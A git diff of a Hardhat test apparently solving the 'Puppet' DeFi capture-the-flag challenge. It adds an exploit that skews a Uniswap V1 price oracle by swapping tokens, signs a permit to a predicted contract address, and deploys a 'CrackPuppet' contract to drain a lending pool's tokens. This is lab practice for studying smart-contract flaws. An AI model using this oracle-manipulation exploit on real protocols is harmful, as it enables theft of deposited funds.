@@ -4,10 +4,85 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { time } = require('@nomicfoundation/hardhat-network-helpers');
+const ethJsUtil = require('ethereumjs-util');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
     return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
+}
+
+const rlp = require("rlp");
+const keccak = require("keccak");
+
+async function predictContractAddress(deployer) {
+
+  const nonce = await ethers.provider.getTransactionCount(deployer.address); //The nonce must be a hex literal!
+  const sender = deployer.address; //Requires a hex string as input!
+
+  const input_arr = [sender, nonce];
+  const rlp_encoded = rlp.encode(input_arr);
+
+  const contract_address_long = keccak("keccak256")
+    .update(rlp_encoded)
+    .digest("hex");
+
+  const contract_address = contract_address_long.substring(24); //Trim the first 24 characters.
+  return contract_address;
+}
+
+async function doArbitrage(value, ...params) {
+  const chainId = (await ethers.provider.getNetwork()).chainId;
+  // set the domain parameters
+  const domain = {
+    name: await token.name(),
+    version: "1",
+    chainId: chainId,
+    verifyingContract: token.address
+  };
+
+  // set the Permit type parameters
+  const types = {
+    Permit: [{
+        name: "owner",
+        type: "address"
+      },
+      {
+        name: "spender",
+        type: "address"
+      },
+      {
+        name: "value",
+        type: "uint256"
+      },
+      {
+        name: "nonce",
+        type: "uint256"
+      },
+      {
+        name: "deadline",
+        type: "uint256"
+      },
+    ],
+  };
+
+  const predictedAddress = await predictContractAddress(player);
+  console.log("predicted address: " + predictedAddress);
+
+  const deadline = (await time.latest()) + 9999999;
+  const values = {
+    owner: player.address,
+    spender: predictedAddress,
+    value: PLAYER_INITIAL_TOKEN_BALANCE,
+    nonce: await token.nonces(player.address),
+    deadline: deadline,
+  };
+  const signature = await player._signTypedData(domain, types, values);
+  const sig = ethers.utils.splitSignature(signature);
+
+  const arbitrageContract = await (await ethers.getContractFactory('Arbitrage', player)).deploy(...params, sig.v, sig.r, sig.s, { value });
+
+  console.log(`Actual address: ${arbitrageContract.address}`);
 }
 
 describe('[Challenge] Puppet', function () {
@@ -95,6 +170,101 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      // pool has 100K DVT tokens and 0 ETH balance
+      // player have to take all tokens from pool in a single transaction
+      // player can only call borrow funstion
+      // player should provide calculateDepositRequired(100K DVT) ETh to bowwor all tokens
+      const uniswapExchangeEthBalance = await ethers.provider.getBalance(uniswapExchange.address);
+      const uniswapExchangeTokenBalance = await token.balanceOf(uniswapExchange.address);
+      const oraclePrice = uniswapExchangeEthBalance * (10 ** 18) / uniswapExchangeTokenBalance;
+      console.log(`uniswapExchange balance is ${uniswapExchangeEthBalance}`);
+      console.log(`uniswapExchange token balance is ${uniswapExchangeTokenBalance}`);
+      console.log(`Oracle price is ${oraclePrice}`);
+      console.log(`Deposit required is ${await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}`)
+
+      // initially exchange price is 10^18
+      // so 2 ETH have to be deposited per each DVT
+      // that would be 200K ETH
+      // player only has 25ETH and 1K DVT tokens
+      // minimal deposit to borrow 100K DVT tokens is 24ETH - as player also pays transaction fee
+      // oracle price should be less than: 100K * x * 2 = 24 => x = 12 /100 = 0.12
+      // I should set oracle price to less than 0.12
+      // exchETH * 10^18 / exchDVT = 0.12 => exchDVT * 0.12 = echhETH * 10^18 => exchDVT = exchETH * 8.33333 * 10^18
+      // let's set exchDVT = exchETH * 10 * 10^18
+      // let's swap tokens in pool to manipulate oracle price
+      // Pool: 10 DVT and 10 ETH
+      // Player: 1000DVT and 25 ETH
+      // Oracle price: 10^18
+      // To lower the price we should have less ETH and more tokens
+      // Swap eth to tokens will lower the price
+      // Add tokens will also lower the price but addLiquidity preserves ration - thus this is not an option
+      // 
+
+
+
+      /// Solution starts
+        //await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        //const deadline = await time.latest();
+        //console.log(`Deadline is: ${deadline}`);
+        //await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline + 9999999);
+        //const depositValue = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        //console.log(`Deposit required is ${depositValue}`);
+        //await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: depositValue});
+      /// solution ends
+
+      //await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, { value: 24n * 10n ** 18n,  gasLimit: 30000000 });
+
+    const chainId = (await ethers.provider.getNetwork()).chainId;
+    // set the domain parameters
+    const domain = {
+      name: await token.name(),
+      version: "1",
+      chainId: chainId,
+      verifyingContract: token.address
+    };
+  
+    // set the Permit type parameters
+    const types = {
+      Permit: [{
+          name: "owner",
+          type: "address"
+        },
+        {
+          name: "spender",
+          type: "address"
+        },
+        {
+          name: "value",
+          type: "uint256"
+        },
+        {
+          name: "nonce",
+          type: "uint256"
+        },
+        {
+          name: "deadline",
+          type: "uint256"
+        },
+      ],
+    };
+
+    const predictedAddress = await predictContractAddress(player);
+    console.log("predicted address: " + predictedAddress);
+
+    const deadline = (await time.latest()) + 9999999;
+    const values = {
+      owner: player.address,
+      spender: predictedAddress,
+      value: PLAYER_INITIAL_TOKEN_BALANCE,
+      nonce: 0,
+      deadline: deadline,
+    };
+    const signature = await player._signTypedData(domain, types, values);
+    const sig = ethers.utils.splitSignature(signature);
+
+    const crackPuppet = await (await ethers.getContractFactory('CrackPuppet', player)).deploy(uniswapExchange.address, token.address, lendingPool.address, deadline, sig.v, sig.r, sig.s, {value: 24n * 10n ** 18n });
+
+    console.log(`Actual address: ${crackPuppet.address}`);
     });
 
     after(async function () {
